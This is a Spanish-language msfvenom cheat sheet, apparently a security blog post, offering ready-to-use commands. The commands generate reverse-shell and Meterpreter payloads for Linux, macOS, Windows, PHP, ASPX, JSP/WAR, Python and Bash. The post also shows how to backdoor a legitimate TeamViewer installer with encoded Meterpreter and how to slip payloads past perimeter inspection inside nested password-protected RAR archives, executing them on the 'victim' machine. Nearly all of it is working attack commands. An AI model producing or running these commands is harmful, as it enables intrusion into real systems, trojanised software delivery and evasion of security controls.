---
title: "Chuleta de Msfvenom (Generación de Payloads y Evasión)"
pubDate: '2026-08-26'
---

## ¿Qué es Msfvenom?
**Msfvenom** es la herramienta de la suite Metasploit diseñada para generar y codificar diversos tipos de payloads (código malicioso). Permite personalizar la plataforma, la arquitectura y el formato del archivo de salida.

### Concepto Clave: Staged vs Stageless
Es fundamental comprender la diferencia en la nomenclatura de los payloads:

| Tipo | Formato del Nombre | Características y Uso |
| :--- | :--- | :--- |
| **Staged** | Contiene barra `/`<br>Ej: `windows/x64/shell/reverse_tcp`<br>`windows/meterpreter/reverse_tcp` | Envía primero un pequeño *stager* (~350 bytes) para establecer la conexión inicial y descargar el payload completo en memoria. Ideal para explotación de Buffer Overflows con espacio de memoria muy reducido. Requiere un listener en Metasploit (`multi/handler`). |
| **Stageless** | Contiene guión bajo `_`<br>Ej: `windows/x64/shell_reverse_tcp`<br>`windows/meterpreter_reverse_tcp` | Empaqueta todo el payload dentro del mismo binario. Es más pesado pero mucho más estable frente a redes segmentadas (evita bloqueos de firewall en la segunda fase), facilita la ofuscación y funciona directamente con Netcat (`nc -lvnp <PUERTO>`). |

---

## 🐚 1. Payloads para Linux y Unix

```bash
# Linux x64 Stageless Shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<TU_IP> LPORT=4444 -f elf > shell.elf

# Linux x64 Meterpreter
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<TU_IP> LPORT=4444 -f elf > shell.elf

# macOS (Macho x64)
msfvenom -p osx/x64/shell_reverse_tcp LHOST=<TU_IP> LPORT=4444 -f macho -o shell.macho
```

---

## 🪟 2. Payloads para Windows

```bash
# Windows x64 Stageless EXE
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<TU_IP> LPORT=4444 -f exe -o shell.exe

# Windows x64 Meterpreter
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<TU_IP> LPORT=4444 -f exe -o shell.exe

# Windows x86 Meterpreter (32-bit)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<TU_IP> LPORT=4444 -f exe -o shell.exe

# Librería dinámica (DLL)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<TU_IP> LPORT=4444 -f dll -o shell.dll

# Instalador MSI (para AlwaysInstallElevated)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<TU_IP> LPORT=4444 -f msi -o shell.msi

# PowerShell Script
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<TU_IP> LPORT=4444 -f psh -o shell.ps1
```

---

## 🌐 3. Payloads Web y Scripting

```bash
# PHP (Raw)
msfvenom -p php/reverse_php LHOST=<TU_IP> LPORT=4444 -f raw -o shell.php
msfvenom -p php/meterpreter/reverse_tcp LHOST=<TU_IP> LPORT=4444 -f raw -o shell.php

# ASPX (IIS Server)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<TU_IP> LPORT=4444 -f aspx -o shell.aspx
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<TU_IP> LPORT=4444 -f asp -o shell.asp

# JSP y WAR (Apache Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<TU_IP> LPORT=4444 -f raw -o shell.jsp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<TU_IP> LPORT=4444 -f war -o shell.war

# Python
msfvenom -p python/meterpreter/reverse_tcp LHOST=<TU_IP> LPORT=4444 -f raw -o shell.py

# Bash One-Liner
msfvenom -p cmd/unix/reverse_bash LHOST=<TU_IP> LPORT=4444 -f raw -o shell.sh

# Shellcode en formato C (excluyendo bytes nulos \x00)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<TU_IP> LPORT=4444 -b "\x00" -f c
```

---

## 💉 4. Inyección en Binarios Legítimos y Encoders

Permite incrustar el payload dentro de un ejecutable legítimo (ej. un instalador existente) manteniendo el hilo de ejecución (`-k`):

```bash
# Inyectar Meterpreter en el instalador de TeamViewer con 5 iteraciones de Shikata Ga Nai
msfvenom -a x86 --platform windows -p windows/meterpreter_reverse_tcp LHOST=<TU_IP> LPORT=4444 -e x86/shikata_ga_nai -i 5 -k -x ~/Downloads/TeamViewer_Setup.exe -f exe -o ~/Desktop/TeamViewer_Setup.exe
```

---

## 📦 5. Evasión de Inspección Perimetral mediante Empaquetado RAR Cifrado

Técnica para transferir payloads a través de proxies o firewalls que inspeccionan firmas en archivos comprimidos:

### En la Máquina Atacante:
```bash
# 1. Comprimir payload con contraseña
rar a test.rar -p'Pass123!' payload.js

# 2. Quitar extensión .rar
mv test.rar test

# 3. Volver a comprimir en una segunda capa con contraseña distinta
rar a test2.rar -p'Pass456!' test
mv test2.rar test2
```

### En la Máquina Víctima:
```bash
# Restaurar extensiones y descomprimir por capas introduciendo las claves
mv test2 test2.rar
rar x test2.rar
mv test test.rar
rar x test.rar
node payload.js
```
